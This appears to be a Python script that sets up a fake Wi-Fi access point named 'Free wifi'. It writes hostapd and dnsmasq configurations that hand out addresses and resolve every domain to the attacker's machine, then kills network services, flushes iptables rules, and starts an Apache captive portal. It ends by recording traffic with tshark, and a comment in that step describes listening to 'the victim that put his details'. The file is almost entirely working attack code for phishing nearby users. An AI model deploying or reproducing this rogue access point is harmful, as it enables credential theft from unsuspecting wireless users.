import os

# ============ Configuration Files =======================

def Create_hostapd(iface, ssid="Free wifi", channel=1):
    interface_str= "interface="+str(iface)+"\n"
    driver_str="driver=nl80211\n"
    ssid_str= "ssid="+str(ssid)+".\n"
    channel_str = "channel="+str(channel)+" \n"
    conf_str= interface_str+driver_str+ssid_str+channel_str
    f = open("hostapd.conf", "w+")
    f.write(conf_str)
    os.chmod("hostapd.conf",0o777)

#configure dnsmasq to be used as a DHCP server and DNS server.
def Create_dnsmasq(iface):
    iface_str= "interface="+str(iface)+""
    #IP address range for the connected network clients. 12h is the amount of hours until the lease expires.
    body_str= "\ndhcp-range=192.168.1.2,192.168.1.250,12h" 
    body_str+="\ndhcp-option=3,192.168.1.1" # Gateway IP for the networks.
    body_str+="\ndhcp-option=6,192.168.1.1" # For DNS Server followed by IP address
    body_str+="\naddress=/#/192.168.1.1"
    conf_str = iface_str+body_str
    f = open("dnsmasq.conf", "w+")
    f.write(conf_str)
    os.chmod("dnsmasq.conf",0o777)   

def Delete_conf_files():
    os.system("rm *.conf")

# ================== Deploy fake AP ==============================

def init_setting():
    # Disable all old proccess
    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('sudo pkill -9 dnsmasq')
    os.system('sudo pkill -9 wpa_supplicant')
    os.system('sudo pkill -9 avahi-daemon')
    os.system('sudo pkill -9 dhclient')
    os.system('sudo pkill -9 hostapd')
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')

    # Clear all IP tables
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    os.system('iptables -P FORWARD ACCEPT')

    os.system('service NetworkManager stop')


def start(iface):
    # Start the fake access point
    os.system('sudo hostapd hostapd.conf -B')
    
    # Start DHCP server to allocate IP addresses to the clients.
    # dnsmasq -C: Specifies a different configuration file.
    os.system('sudo dnsmasq -C dnsmasq.conf')
    
    #Route to localhost
    os.system("sudo ifconfig " + str(iface) + " 192.168.1.1/24")

    #Enable captive portal
    os.system('sudo service apache2 restart')
    
    #Listen to the victim that put his details
    os.system("tshark -i "+ str(iface) +" -w /home/capture/captureAP")
